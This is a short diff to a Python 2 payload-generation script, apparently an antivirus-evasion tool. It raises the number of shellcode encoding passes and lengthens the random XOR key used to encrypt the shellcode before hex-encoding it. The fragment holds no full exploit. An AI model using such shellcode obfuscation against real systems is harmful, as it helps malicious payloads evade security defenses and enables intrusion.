@@ -84,9 +84,9 @@ while 1:
 			port = 8080
 		if encoding == '1' or encoding == '':
 			encoding = '1'
-			iterations = raw_input("Number of times to encode shellcode (default 5): ")
+			iterations = raw_input("Number of times to encode shellcode (default 10): ")
 			if iterations == '':
-				iterations = 5
+				iterations = 10
 
 		# create payload
 		if encoding == '1':
@@ -104,7 +104,7 @@ while 1:
 			PrintInfo("Encoding shellcode")
 			sleep(1)
 
-		key = generate_random_string(5, 10)
+		key = generate_random_string(10, 25)
 		PrintInfo("Using random key %s" % key)
 		encrypted = xor_string(shellcode, key)
 		xor = hexlify(encrypted)
